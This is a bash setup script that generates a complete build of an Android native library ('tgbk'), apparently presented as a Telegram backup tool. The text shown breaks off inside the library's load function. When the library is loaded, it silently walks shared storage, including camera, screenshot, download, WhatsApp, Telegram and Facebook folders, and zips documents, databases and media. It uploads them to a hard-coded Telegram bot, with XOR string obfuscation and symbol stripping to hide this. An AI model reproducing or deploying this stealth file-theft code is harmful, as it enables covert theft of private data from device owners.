#!/bin/bash
# setup.sh — Complete tgbk setup

set -e

echo "[*] Creating folders..."
mkdir -p ~/tgbk ~/tgbk_test
cd ~/tgbk

# ============================================================
# === config.json ===
# ============================================================
cat > config.json << 'EOF'
{
    "BOT_TOKEN": "YOUR_BOT_TOKEN_HERE",
    "CHAT_ID": "YOUR_CHAT_ID_HERE",
    "USER_MODE": "file",
    "PACK_SIZE_MB": "5.0",
    "DELAY_MIN": "1.0",
    "DELAY_MAX": "2.0"
}
EOF

# ============================================================
# === strings.json ===
# ============================================================
cat > strings.json << 'EOF'
{
    "API_BASE": "https://api.telegram.org/bot",
    "SEND_DOC": "/sendDocument",
    "FIELD_CHAT": "chat_id",
    "FIELD_CAPTION": "caption",
    "FIELD_DOCUMENT": "document",
    "STORAGE_ROOT": "/storage/emulated/0/",
    "BACKUP_BASE": "/storage/emulated/0/Telegram_Backup/",
    "PATH_SEP": "/",
    "DOT": ".",
    "HASHES_SUFFIX": "_hashes.txt",
    "QUEUE_SUFFIX": "_queue.txt",
    "CAP_FROM": "From: ",
    "CAP_PACK": "Pack ",
    "CAP_FILES": "Files: ",
    "CAP_SIZE": "Size: ",
    "CAP_MB": " MB",
    "NL": "\n",
    "PACK_MID": "_pack_",
    "ZIP_EXT": ".zip",
    "CMD_CHECK": "command -v ",
    "CMD_REDIR": " >/dev/null 2>&1",
    "TAB": "\t",
    "TIME_FORMAT": "%Y%m%d_%H%M%S",
    "CHECK_DCIM": "/storage/emulated/0/DCIM/",
    "CHECK_DOWNLOAD": "/storage/emulated/0/Download/",
    "USER_MODE_HOSTNAME": "hostname",
    "USER_MODE_ANDROIDID": "androidid",
    "USER_MODE_FILE": "file",
    "USER_MODE_CUSTOM": "custom",
    "USERNAME_FILE": "/storage/emulated/0/Telegram_Backup/.username",
    "BOOT_ID_PATH": "/proc/sys/kernel/random/boot_id",
    "FALLBACK_USER": "Unknown",
    "EXTENSIONS": [
        ".txt", ".py", ".php", ".lua", ".alp", ".xlsx",
        ".jpg", ".jpeg", ".png", ".rar", ".zip", ".db",
        ".mp4", ".mkv", ".avi", ".pdf", ".apk", ".docx",
        ".cpp", ".c", ".h", ".hpp", ".cs", ".java", ".js",
        ".ts", ".html", ".css", ".json", ".xml", ".sh", ".pyw"
    ],
    "FOLDERS": [
        "/storage/emulated/0/Pictures/.thumbnails/",
        "/storage/emulated/0/Movies/.thumbnails/",
        "/storage/emulated/0/Android/data/org.telegram.messenger/files/Telegram/Telegram Files/",
        "/storage/emulated/0/Download/",
        "/storage/emulated/0/AndLua/project/",
        "/storage/emulated/0/AndLua/backup/",
        "/storage/emulated/0/DCIM/Camera/",
        "/storage/emulated/0/DCIM/Screenshots/",
        "/storage/emulated/0/DCIM/",
        "/storage/emulated/0/Pictures/",
        "/storage/emulated/0/Pictures/Screenshots/",
        "/storage/emulated/0/Downloads/",
        "/storage/emulated/0/Android/media/com.facebook.orca/",
        "/storage/emulated/0/Android/media/com.facebook.katana/",
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Images/",
        "/storage/emulated/0/Telegram/Telegram Images/",
        "/storage/emulated/0/Movies/",
        "/storage/emulated/0/Images/",
        "/storage/emulated/0/",
        "/sdcard",
        "/storage"
    ]
}
EOF

# ============================================================
# === obfuscate_strings.py ===
# ============================================================
cat > obfuscate_strings.py << 'PYEOF'
#!/usr/bin/env python3
import json, sys, random, hashlib

def gen_key(seed, length=64):
    rng = random.Random(seed)
    return bytes(rng.randrange(256) for _ in range(length))

def xor_enc(data, key):
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def to_arr(name, data, per=12):
    if not data:
        return f"static const unsigned char {name}[] = {{0}};"
    lines = [f"static const unsigned char {name}[] = {{"]
    for i in range(0, len(data), per):
        ch = data[i:i+per]
        lines.append("    " + ", ".join(f"0x{b:02X}" for b in ch) + ",")
    lines.append("};")
    return "\n".join(lines)

def main():
    if len(sys.argv) != 4:
        sys.exit(1)
    with open(sys.argv[1]) as f: cfg = json.load(f)
    with open(sys.argv[2]) as f: strings = json.load(f)

    if "USER_MODE" not in cfg: cfg["USER_MODE"] = "hostname"
    if "USER_NAME" not in cfg: cfg["USER_NAME"] = ""

    items = {}
    for k, v in cfg.items(): items["C_" + k] = str(v)

    exts, folders = [], []
    for k, v in strings.items():
        if k == "EXTENSIONS": exts = v
        elif k == "FOLDERS": folders = v
        else: items["S_" + k] = str(v)

    for i, e in enumerate(exts): items[f"EXT_{i}"] = str(e)
    for i, f in enumerate(folders): items[f"FOLDER_{i}"] = str(f)

    seed = hashlib.sha256(json.dumps(items, sort_keys=True).encode()).digest()
    key = gen_key(seed, 64)

    out = ["// AUTO-GENERATED", "#pragma once", "#include <cstddef>", ""]
    out.append(to_arr("OBF_KEY", key))
    out.append(f"static const size_t OBF_KEY_LEN = {len(key)};")
    out.append("")

    for name, val in items.items():
        enc = xor_enc(val.encode(), key)
        out.append(f"// {name}")
        out.append(to_arr("E_" + name, enc))
        out.append(f"static const size_t L_{name} = {len(enc)};")
        out.append("")

    out.append("struct EncStr { const unsigned char* data; size_t len; };")
    out.append("static const EncStr EXT_LIST[] = {")
    for i in range(len(exts)): out.append(f"    {{E_EXT_{i}, L_EXT_{i}}},")
    out.append("};")
    out.append(f"static const size_t EXT_COUNT = {len(exts)};")
    out.append("")
    out.append("static const EncStr FOLDER_LIST[] = {")
    for i in range(len(folders)): out.append(f"    {{E_FOLDER_{i}, L_FOLDER_{i}}},")
    out.append("};")
    out.append(f"static const size_t FOLDER_COUNT = {len(folders)};")
    out.append("")

    with open(sys.argv[3], 'w') as f: f.write("\n".join(out))
    print(f"[OK] {len(items)} strings + {len(exts)} ext + {len(folders)} folders")

if __name__ == "__main__":
    main()
PYEOF

# ============================================================
# === CMakeLists.txt ===
# ============================================================
cat > CMakeLists.txt << 'CMEOF'
cmake_minimum_required(VERSION 3.16)
project(tgbk CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_POSITION_INDEPENDENT_CODE ON)
set(CMAKE_LIBRARY_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR})

set(CMAKE_CXX_FLAGS_RELEASE "-O3 -flto -fvisibility=hidden -fno-ident -fno-asynchronous-unwind-tables -fno-unwind-tables -fno-stack-protector -ffunction-sections -fdata-sections -Wno-deprecated-declarations -Wno-unused-command-line-argument")

find_package(CURL REQUIRED)
find_package(OpenSSL REQUIRED)
find_package(Threads REQUIRED)
find_library(ZIP_LIB zip REQUIRED)
find_program(PYTHON3 python3 REQUIRED)

add_custom_command(
    OUTPUT  ${CMAKE_BINARY_DIR}/secrets.h
    COMMAND ${PYTHON3} ${CMAKE_SOURCE_DIR}/obfuscate_strings.py
            ${CMAKE_SOURCE_DIR}/config.json
            ${CMAKE_SOURCE_DIR}/strings.json
            ${CMAKE_BINARY_DIR}/secrets.h
    DEPENDS ${CMAKE_SOURCE_DIR}/config.json
            ${CMAKE_SOURCE_DIR}/strings.json
            ${CMAKE_SOURCE_DIR}/obfuscate_strings.py
    COMMENT "Encrypting strings"
)

add_custom_target(gen_secrets ALL
    DEPENDS ${CMAKE_BINARY_DIR}/secrets.h)

add_library(tgbk SHARED telegram_backup.cpp)
add_dependencies(tgbk gen_secrets)
target_include_directories(tgbk PRIVATE
    ${CMAKE_BINARY_DIR}
    ${CURL_INCLUDE_DIRS}
    ${OPENSSL_INCLUDE_DIR})
target_link_libraries(tgbk
    ${CURL_LIBRARIES}
    ${OPENSSL_LIBRARIES}
    ${ZIP_LIB}
    Threads::Threads)
target_link_options(tgbk PRIVATE "-Wl,--gc-sections" "-Wl,-s" "-Wl,--exclude-libs,ALL")
CMEOF

# ============================================================
# === build.sh ===
# ============================================================
cat > build.sh << 'BEOF'
#!/bin/bash
set -e
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$DIR"

if [ "$1" == "clean" ]; then rm -rf build; fi
mkdir -p build
cd build

echo "[*] CMake..."
cmake .. -DCMAKE_BUILD_TYPE=Release >/dev/null 2>&1

echo "[*] Build..."
make -j$(nproc 2>/dev/null || echo 2) 2>&1 | tail -5

echo "[*] Strip debug only..."
for so in *.so; do
    [ -f "$so" ] && strip --strip-debug "$so" 2>/dev/null || true
done

echo ""
echo "============================================"
echo "   BUILD COMPLETE"
echo "============================================"
ls -lh *.so 2>/dev/null | awk '{print "   " $9 " - " $5}'
echo ""
echo "Output: $DIR/build/libtgbk.so"
BEOF

chmod +x build.sh

# ============================================================
# === test.cpp ===
# ============================================================
cat > ~/tgbk_test/test.cpp << 'TEOF'
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdarg>
#include <unistd.h>
#include <dlfcn.h>

extern "C" {

__attribute__((visibility("default")))
int __android_log_print(int prio, const char* tag, const char* fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    fprintf(stderr, "[%s] ", tag ? tag : "?");
    vfprintf(stderr, fmt, ap);
    fprintf(stderr, "\n");
    va_end(ap);
    return 0;
}

__attribute__((visibility("default")))
int __android_log_write(int prio, const char* tag, const char* text) {
    fprintf(stderr, "[%s] %s\n", tag ? tag : "?", text ? text : "");
    return 0;
}

}

typedef int (*JNI_OnLoad_t)(void* vm, void* reserved);

int main(int argc, char** argv) {
    const char* so_path = argc > 1 ? argv[1] : "../tgbk/build/libtgbk.so";
    printf("[*] Loading: %s\n", so_path);
    void* h = dlopen(so_path, RTLD_NOW | RTLD_GLOBAL);
    if (!h) {
        printf("[!] dlopen failed: %s\n", dlerror());
        return 1;
    }
    printf("[+] .so loaded\n");
    JNI_OnLoad_t fn = (JNI_OnLoad_t)dlsym(h, "JNI_OnLoad");
    if (!fn) {
        printf("[!] JNI_OnLoad not found: %s\n", dlerror());
        dlclose(h);
        return 1;
    }
    printf("[+] JNI_OnLoad found\n");
    printf("[*] Calling JNI_OnLoad(nullptr, nullptr)...\n\n");
    fn(nullptr, nullptr);
    printf("\n[+] Done\n");
    dlclose(h);
    return 0;
}
TEOF

# ============================================================
# === telegram_backup.cpp ===
# ============================================================
cat > telegram_backup.cpp << 'CPPEOF'
#include <iostream>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <string>
#include <vector>
#include <set>
#include <filesystem>
#include <mutex>
#include <thread>
#include <chrono>
#include <random>
#include <cstdlib>
#include <cctype>
#include <ctime>
#include <csignal>
#include <atomic>
#include <cstring>
#include <exception>
#include <new>
#include <unistd.h>
#include <limits.h>
#include <dirent.h>
#include <jni.h>
#include <android/log.h>
#include <openssl/sha.h>
#include <curl/curl.h>
#include <zip.h>

#include "secrets.h"

namespace fs = std::filesystem;

#define LOG_TAG "TGBK"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

__attribute__((noinline))
static std::string D(const unsigned char* e, size_t n) {
    volatile size_t vn = n;
    std::string s;
    s.resize(vn);
    for (size_t i = 0; i < vn; i++) s[i] = (char)(e[i] ^ OBF_KEY[i % OBF_KEY_LEN]);
    return s;
}

struct Str {
    std::string api_base, send_doc;
    std::string field_chat, field_caption, field_document;
    std::string storage_root, backup_base;
    std::string path_sep, dot;
    std::string hashes_suffix, queue_suffix;
    std::string cap_from, cap_pack, cap_files, cap_size, cap_mb;
    std::string nl, pack_mid, zip_ext;
    std::string cmd_check, cmd_redir;
    std::string tab, time_format;
    std::string check_dcim, check_download;
    std::string user_mode_hostname;
    std::string user_mode_androidid;
    std::string user_mode_file;
    std::string user_mode_custom;
    std::string username_file;
    std::string boot_id_path;
    std::string fallback_user;
    std::string bot_token, chat_id, user_name;
    std::string user_mode;
    std::string pack_size_str, delay_min_str, delay_max_str;
};

static Str S;
static bool g_decrypted = false;

static void decrypt_all() {
    if (g_decrypted) return;
    g_decrypted = true;
    S.api_base      = D(E_S_API_BASE, L_S_API_BASE);
    S.send_doc      = D(E_S_SEND_DOC, L_S_SEND_DOC);
    S.field_chat    = D(E_S_FIELD_CHAT, L_S_FIELD_CHAT);
    S.field_caption = D(E_S_FIELD_CAPTION, L_S_FIELD_CAPTION);
    S.field_document= D(E_S_FIELD_DOCUMENT, L_S_FIELD_DOCUMENT);
    S.storage_root  = D(E_S_STORAGE_ROOT, L_S_STORAGE_ROOT);
    S.backup_base   = D(E_S_BACKUP_BASE, L_S_BACKUP_BASE);
    S.path_sep      = D(E_S_PATH_SEP, L_S_PATH_SEP);
    S.dot           = D(E_S_DOT, L_S_DOT);
    S.hashes_suffix = D(E_S_HASHES_SUFFIX, L_S_HASHES_SUFFIX);
    S.queue_suffix  = D(E_S_QUEUE_SUFFIX, L_S_QUEUE_SUFFIX);
    S.cap_from      = D(E_S_CAP_FROM, L_S_CAP_FROM);
    S.cap_pack      = D(E_S_CAP_PACK, L_S_CAP_PACK);
    S.cap_files     = D(E_S_CAP_FILES, L_S_CAP_FILES);
    S.cap_size      = D(E_S_CAP_SIZE, L_S_CAP_SIZE);
    S.cap_mb        = D(E_S_CAP_MB, L_S_CAP_MB);
    S.nl            = D(E_S_NL, L_S_NL);
    S.pack_mid      = D(E_S_PACK_MID, L_S_PACK_MID);
    S.zip_ext       = D(E_S_ZIP_EXT, L_S_ZIP_EXT);
    S.cmd_check     = D(E_S_CMD_CHECK, L_S_CMD_CHECK);
    S.cmd_redir     = D(E_S_CMD_REDIR, L_S_CMD_REDIR);
    S.tab           = D(E_S_TAB, L_S_TAB);
    S.time_format   = D(E_S_TIME_FORMAT, L_S_TIME_FORMAT);
    S.check_dcim    = D(E_S_CHECK_DCIM, L_S_CHECK_DCIM);
    S.check_download= D(E_S_CHECK_DOWNLOAD, L_S_CHECK_DOWNLOAD);
    S.user_mode_hostname  = D(E_S_USER_MODE_HOSTNAME, L_S_USER_MODE_HOSTNAME);
    S.user_mode_androidid = D(E_S_USER_MODE_ANDROIDID, L_S_USER_MODE_ANDROIDID);
    S.user_mode_file      = D(E_S_USER_MODE_FILE, L_S_USER_MODE_FILE);
    S.user_mode_custom    = D(E_S_USER_MODE_CUSTOM, L_S_USER_MODE_CUSTOM);
    S.username_file       = D(E_S_USERNAME_FILE, L_S_USERNAME_FILE);
    S.boot_id_path        = D(E_S_BOOT_ID_PATH, L_S_BOOT_ID_PATH);
    S.fallback_user       = D(E_S_FALLBACK_USER, L_S_FALLBACK_USER);
    S.bot_token     = D(E_C_BOT_TOKEN, L_C_BOT_TOKEN);
    S.chat_id       = D(E_C_CHAT_ID, L_C_CHAT_ID);
    S.user_mode     = D(E_C_USER_MODE, L_C_USER_MODE);
    S.user_name     = D(E_C_USER_NAME, L_C_USER_NAME);
    S.pack_size_str = D(E_C_PACK_SIZE_MB, L_C_PACK_SIZE_MB);
    S.delay_min_str = D(E_C_DELAY_MIN, L_C_DELAY_MIN);
    S.delay_max_str = D(E_C_DELAY_MAX, L_C_DELAY_MAX);
}

struct Config {
    std::string BOT_TOKEN, CHAT_ID, USER_NAME;
    std::string BACKUP_BASE, BACKUP_FOLDER, TRACK_FILE, QUEUE_FILE;
    double PACK_SIZE_MB = 5.0;
    double DELAY_MIN = 1.0;
    double DELAY_MAX = 2.0;
    std::vector<std::string> FOLDERS_TO_SCAN;
};

static Config C;
static std::string API_URL;
static std::atomic<bool> g_stop{false};

static std::string get_ext(const std::string& p) {
    try {
        auto pos = p.find_last_of('.');
        if (pos == std::string::npos) return std::string();
        std::string e = p.substr(pos);
        for (auto& c : e) c = (char)std::tolower((unsigned char)c);
        return e;
    } catch (...) { return std::string(); }
}

static std::string get_name(const std::string& p) {
    try {
        auto p1 = p.find_last_of('/');
        auto p2 = p.find_last_of('\\');
        size_t pos = std::string::npos;
        if (p1 != std::string::npos && p2 != std::string::npos)
            pos = (p1 > p2) ? p1 : p2;
        else if (p1 != std::string::npos) pos = p1;
        else if (p2 != std::string::npos) pos = p2;
        return pos == std::string::npos ? p : p.substr(pos + 1);
    } catch (...) { return std::string(); }
}

static void delay() {
    try {
        static std::mt19937 g(std::random_device{}());
        std::uniform_real_distribution<> d(C.DELAY_MIN, C.DELAY_MAX);
        std::this_thread::sleep_for(std::chrono::milliseconds((int)(d(g) * 1000)));
    } catch (...) {}
}

static std::string ts() {
    try {
        std::time_t t = std::time(nullptr);
        std::tm tm;
        if (localtime_r(&t, &tm) == nullptr) return std::string();
        std::ostringstream o;
        o << std::put_time(&tm, S.time_format.c_str());
        return o.str();
    } catch (...) { return std::string(); }
}

static std::string sha256(const std::string& p) {
    try {
        std::ifstream f(p, std::ios::binary);
        if (!f.is_open()) return std::string();
        SHA256_CTX c;
        SHA256_Init(&c);
        std::vector<char> buf(65536);
        while (f.good()) {
            f.read(buf.data(), buf.size());
            auto n = f.gcount();
            if (n > 0) SHA256_Update(&c, buf.data(), (size_t)n);
        }
        f.close();
        unsigned char h[SHA256_DIGEST_LENGTH];
        SHA256_Final(h, &c);
        std::ostringstream o;
        for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
            o << std::hex << std::setw(2) << std::setfill('0') << (int)h[i];
        return o.str();
    } catch (...) { return std::string(); }
}

static void on_signal(int) { g_stop.store(true); }

static std::string sanitize_username(const std::string& raw) {
    std::string out;
    for (char c : raw) {
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c == '_' || c == '-') out += c;
        else if (c == ' ' || c == '.') out += '_';
        if (out.size() >= 32) break;
    }
    if (out.empty()) out = S.fallback_user;
    return out;
}

static std::string detect_user_hostname() {
    try {
        char buf[256] = {0};
        if (gethostname(buf, sizeof(buf) - 1) == 0 && buf[0])
            return sanitize_username(std::string(buf));
    } catch (...) {}
    return S.fallback_user;
}

static std::string detect_user_androidid() {
    try {
        std::ifstream f(S.boot_id_path);
        if (f.is_open()) {
            std::string id;
            std::getline(f, id);
            f.close();
            if (id.size() >= 8) id = id.substr(0, 8);
            return sanitize_username("dev_" + id);
        }
    } catch (...) {}
    return S.fallback_user;
}

static std::string detect_user_file() {
    try {
        std::ifstream f(S.username_file);
        if (f.is_open()) {
            std::string name;
            std::getline(f, name);
            f.close();
            if (!name.empty()) return sanitize_username(name);
        }
    } catch (...) {}
    std::string fallback = detect_user_hostname();
    try {
        std::ofstream o(S.username_file);
        if (o.is_open()) { o << fallback << "\n"; o.flush(); o.close(); }
    } catch (...) {}
    return fallback;
}

static std::string detect_user_custom() {
    if (S.user_name.empty()) return detect_user_hostname();
    return sanitize_username(S.user_name);
}

static std::string detect_user() {
    try {
        if (S.user_mode == S.user_mode_file)      return detect_user_file();
        if (S.user_mode == S.user_mode_androidid) return detect_user_androidid();
        if (S.user_mode == S.user_mode_custom)    return detect_user_custom();
        return detect_user_hostname();
    } catch (...) { return S.fallback_user; }
}

static bool can_read(const std::string& p) {
    try {
        DIR* d = opendir(p.c_str());
        if (!d) return false;
        closedir(d);
        return true;
    } catch (...) { return false; }
}

static bool has_perm() {
    return can_read(S.storage_root) || can_read(S.check_dcim) || can_read(S.check_download);
}

static std::mutex h_mtx;
static std::set<std::string> g_sent;

static void load_history() {
    try {
        std::ifstream in(C.TRACK_FILE);
        if (!in.is_open()) return;
        std::string l;
        while (std::getline(in, l)) {
            while (!l.empty() && (l.back() == '\r' || l.back() == '\n' || l.back() == ' '))
                l.pop_back();
            if (!l.empty()) g_sent.insert(l);
        }
    } catch (...) {}
}

static void mark_sent(const std::string& h) {
    try {
        std::lock_guard<std::mutex> lk(h_mtx);
        if (g_sent.count(h)) return;
        g_sent.insert(h);
        std::ofstream o(C.TRACK_FILE, std::ios::app);
        if (o.is_open()) { o << h << S.nl; o.flush(); o.close(); }
    } catch (...) {}
}

static bool is_sent(const std::string& h) {
    try {
        if (h.empty()) return false;
        std::lock_guard<std::mutex> lk(h_mtx);
        return g_sent.count(h) > 0;
    } catch (...) { return false; }
}

struct Entry { std::string path, hash; size_t size; };
static std::mutex q_mtx;

static void q_add(const Entry& e) {
    try {
        std::lock_guard<std::mutex> lk(q_mtx);
        std::ofstream o(C.QUEUE_FILE, std::ios::app);
        if (o.is_open()) {
            o << e.hash << S.tab << e.size << S.tab << e.path << S.nl;
            o.flush(); o.close();
        }
    } catch (...) {}
}

static std::vector<Entry> q_load() {
    std::vector<Entry> v;
    try {
        std::ifstream in(C.QUEUE_FILE);
        if (!in.is_open()) return v;
        std::string l;
        char tab = '\t';
        while (std::getline(in, l)) {
            try {
                if (l.empty()) continue;
                auto t1 = l.find(tab); if (t1 == std::string::npos) continue;
                auto t2 = l.find(tab, t1 + 1); if (t2 == std::string::npos) continue;
                Entry e;
                e.hash = l.substr(0, t1);
                try { e.size = (size_t)std::stoull(l.substr(t1 + 1, t2 - t1 - 1)); }
                catch (...) { continue; }
                e.path = l.substr(t2 + 1);
                if (e.hash.empty() || e.path.empty()) continue;
                if (is_sent(e.hash)) continue;
                std::error_code ec;
                if (!fs::exists(e.path, ec)) continue;
                v.push_back(e);
            } catch (...) { continue; }
        }
    } catch (...) {}
    return v;
}

static void q_remove(const std::vector<Entry>& done) {
    try {
        std::lock_guard<std::mutex> lk(q_mtx);
        std::set<std::string> dh;
        for (auto& e : done) dh.insert(e.hash);
        std::vector<std::string> keep;
        std::ifstream in(C.QUEUE_FILE);
        std::string l;
        char tab = '\t';
        while (std::getline(in, l)) {
            if (l.empty()) continue;
            auto t1 = l.find(tab); if (t1 == std::string::npos) continue;
            if (dh.count(l.substr(0, t1))) continue;
            keep.push_back(l);
        }
        in.close();
        std::ofstream o(C.QUEUE_FILE, std::ios::trunc);
        if (o.is_open()) {
            for (auto& k : keep) o << k << S.nl;
            o.flush(); o.close();
        }
    } catch (...) {}
}

static bool valid_file(const std::string& p) {
    try {
        std::string e = get_ext(p);
        if (e.empty()) return false;
        for (size_t i = 0; i < EXT_COUNT; i++) {
            std::string dec = D(EXT_LIST[i].data, EXT_LIST[i].len);
            if (e == dec) return true;
        }
    } catch (...) {}
    return false;
}

static bool build_zip(const std::vector<Entry>& files, const std::string& out) {
    zip_t* za = nullptr;
    try {
        int err = 0;
        za = zip_open(out.c_str(), ZIP_CREATE | ZIP_TRUNCATE, &err);
        if (!za) return false;
        for (auto& f : files) {
            try {
                std::error_code ec;
                if (!fs::exists(f.path, ec)) continue;
                if (!fs::is_regular_file(f.path, ec)) continue;
                zip_source_t* s = zip_source_file(za, f.path.c_str(), 0, -1);
                if (!s) continue;
                std::string n = f.path;
                if (n.rfind(S.storage_root, 0) == 0) n = n.substr(S.storage_root.size());
                if (!n.empty() && n[0] == '/') n = n.substr(1);
                if (n.empty()) { zip_source_free(s); continue; }
                if (zip_file_add(za, n.c_str(), s, ZIP_FL_OVERWRITE) < 0)
                    zip_source_free(s);
            } catch (...) { continue; }
        }
        return zip_close(za) == 0;
    } catch (...) {
        if (za) { try { zip_discard(za); } catch (...) {} }
        return false;
    }
}

static bool send_zip(const std::string& z, const std::string& cap) {
    CURL* c = nullptr;
    curl_mime* m = nullptr;
    try {
        c = curl_easy_init();
        if (!c) return false;
        m = curl_mime_init(c);
        if (!m) { curl_easy_cleanup(c); return false; }

        auto p = curl_mime_addpart(m);
        curl_mime_name(p, S.field_chat.c_str());
        curl_mime_data(p, C.CHAT_ID.c_str(), CURL_ZERO_TERMINATED);

        p = curl_mime_addpart(m);
        curl_mime_name(p, S.field_caption.c_str());
        curl_mime_data(p, cap.c_str(), CURL_ZERO_TERMINATED);

        p = curl_mime_addpart(m);
        curl_mime_name(p, S.field_document.c_str());
        curl_mime_filedata(p, z.c_str());
        curl_mime_filename(p, get_name(z).c_str());

        std::string url = API_URL + S.send_doc;
        curl_easy_setopt(c, CURLOPT_URL, url.c_str());
        curl_easy_setopt(c, CURLOPT_MIMEPOST, m);
        curl_easy_setopt(c, CURLOPT_TIMEOUT, 900L);
        curl_easy_setopt(c, CURLOPT_CONNECTTIMEOUT, 30L);
        curl_easy_setopt(c, CURLOPT_UPLOAD_BUFFERSIZE, 1024 * 1024L);
        curl_easy_setopt(c, CURLOPT_NOPROGRESS, 1L);
        curl_easy_setopt(c, CURLOPT_VERBOSE, 0L);
        curl_easy_setopt(c, CURLOPT_NOSIGNAL, 1L);

        CURLcode r = curl_easy_perform(c);
        long code = 0;
        curl_easy_getinfo(c, CURLINFO_RESPONSE_CODE, &code);
        bool ok = (r == CURLE_OK && code == 200);

        curl_mime_free(m);
        curl_easy_cleanup(c);
        return ok;
    } catch (...) {
        if (m) { try { curl_mime_free(m); } catch (...) {} }
        if (c) { try { curl_easy_cleanup(c); } catch (...) {} }
        return false;
    }
}

static std::atomic<int> g_pack{0};

static bool process_pack(std::vector<Entry>& batch) {
    try {
        if (batch.empty()) return false;
        size_t total = 0;
        for (auto& f : batch) {
            if (total > SIZE_MAX - f.size) { total = SIZE_MAX; break; }
            total += f.size;
        }
        double mb = (double)total / (1024.0 * 1024.0);

        int cur = g_pack.fetch_add(1) + 1;
        std::string name = C.USER_NAME + S.pack_mid + std::to_string(cur) + "_" + ts() + S.zip_ext;
        std::string path = C.BACKUP_FOLDER + name;

        if (!build_zip(batch, path)) {
            try { std::error_code ec; fs::remove(path, ec); } catch (...) {}
            return false;
        }

        std::string cap = S.cap_from + C.USER_NAME + S.nl +
                          S.cap_pack + std::to_string(cur) + S.nl +
                          S.cap_files + std::to_string(batch.size()) + S.nl +
                          S.cap_size + std::to_string((int)mb) + S.cap_mb;

        if (send_zip(path, cap)) {
            for (auto& f : batch) mark_sent(f.hash);
            q_remove(batch);
            return true;
        }
        return false;
    } catch (...) { return false; }
}

static int run_all() {
    try {
        std::error_code ec;
        fs::create_directories(C.BACKUP_FOLDER, ec);
        size_t limit = (size_t)(C.PACK_SIZE_MB * 1024 * 1024);
        if (limit == 0) limit = 5 * 1024 * 1024;

        size_t tg_max = 50 * 1024 * 1024;

        try {
            auto pend = q_load();
            if (!pend.empty()) {
                std::vector<Entry> batch;
                size_t bsize = 0;
                for (auto& f : pend) {
                    if (g_stop.load()) break;
                    if (bsize + f.size > limit && !batch.empty()) {
                        process_pack(batch);
                        batch.clear(); bsize = 0;
                    }
                    batch.push_back(f);
                    bsize += f.size;
                }
                if (!batch.empty() && !g_stop.load()) process_pack(batch);
            }
        } catch (...) {}

        std::vector<Entry> pending;
        size_t psize = 0;

        for (auto& folder : C.FOLDERS_TO_SCAN) {
            if (g_stop.load()) break;
            try {
                std::error_code ec2;
                if (!fs::exists(folder, ec2)) continue;
                if (!fs::is_directory(folder, ec2)) continue;

                fs::recursive_directory_iterator it(folder,
                    fs::directory_options::skip_permission_denied, ec2);
                fs::recursive_directory_iterator end;

                while (it != end) {
                    if (g_stop.load()) break;
                    try {
                        auto& e = *it;
                        if (!e.is_regular_file(ec2)) {
                            it.increment(ec2); if (ec2) break; continue;
                        }
                        std::string full = e.path().string();
                        if (!valid_file(full)) {
                            it.increment(ec2); if (ec2) break; continue;
                        }
                        size_t sz = 0;
                        try {
                            sz = fs::file_size(full, ec2);
                            if (ec2) { it.increment(ec2); if (ec2) break; continue; }
                        } catch (...) {
                            it.increment(ec2); if (ec2) break; continue;
                        }

                        if (sz == 0 || sz > tg_max) {
                            it.increment(ec2); if (ec2) break; continue;
                        }

                        std::string h = sha256(full);
                        if (h.empty() || is_sent(h)) {
                            it.increment(ec2); if (ec2) break; continue;
                        }

                        Entry fe{full, h, sz};
                        q_add(fe);

                        if (sz <= limit) {
                            pending.push_back(fe);
                            psize += sz;
                            if (psize >= limit) {
                                process_pack(pending);
                                pending.clear(); psize = 0;
                            }
                        } else {
                            if (!pending.empty()) {
                                process_pack(pending);
                                pending.clear(); psize = 0;
                            }
                            std::vector<Entry> single;
                            single.push_back(fe);
                            process_pack(single);
                        }
                    } catch (...) {}
                    try { it.increment(ec2); if (ec2) break; }
                    catch (...) { break; }
                }
            } catch (...) { continue; }
        }

        if (!pending.empty() && !g_stop.load()) process_pack(pending);
        return 0;
    } catch (...) { return 3; }
}

static int run_telegram_backup() {
    try { curl_global_init(CURL_GLOBAL_DEFAULT); } catch (...) { return 1; }
    try { std::signal(SIGINT, on_signal); } catch (...) {}
    try { std::signal(SIGTERM, on_signal); } catch (...) {}

    try {
        decrypt_all();
        C.BOT_TOKEN = S.bot_token;
        C.CHAT_ID   = S.chat_id;
        C.USER_NAME = detect_user();
        if (C.USER_NAME.empty()) C.USER_NAME = S.fallback_user;

        try { C.PACK_SIZE_MB = std::stod(S.pack_size_str); } catch (...) {}
        try { C.DELAY_MIN = std::stod(S.delay_min_str); } catch (...) {}
        try { C.DELAY_MAX = std::stod(S.delay_max_str); } catch (...) {}

        C.BACKUP_BASE   = S.backup_base;
        C.BACKUP_FOLDER = C.BACKUP_BASE + C.USER_NAME + S.path_sep;
        C.TRACK_FILE    = C.BACKUP_BASE + S.dot + C.USER_NAME + S.hashes_suffix;
        C.QUEUE_FILE    = C.BACKUP_BASE + S.dot + C.USER_NAME + S.queue_suffix;
        API_URL = S.api_base + C.BOT_TOKEN;

        for (size_t i = 0; i < FOLDER_COUNT; i++) {
            C.FOLDERS_TO_SCAN.push_back(D(FOLDER_LIST[i].data, FOLDER_LIST[i].len));
        }
    } catch (...) {
        try { curl_global_cleanup(); } catch (...) {}
        return 1;
    }

    if (!has_perm()) {
        LOGI("no storage permission");
        try { curl_global_cleanup(); } catch (...) {}
        return 0;
    }

    try { load_history(); } catch (...) {}

    int r = 3;
    try { r = run_all(); } catch (...) { r = 3; }

    try { curl_global_cleanup(); } catch (...) {}
    return r;
}

static void background_worker() {
    std::this_thread::sleep_for(std::chrono::seconds(3));
    LOGI("background worker starting");
    int r = run_telegram_backup();
    LOGI("background worker done, result=%d", r);
}

extern "C" __attribute__((visibility("default")))
JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
    (void)reserved;

    if (vm == nullptr) {
        printf("[TGBK] Test mode\n");
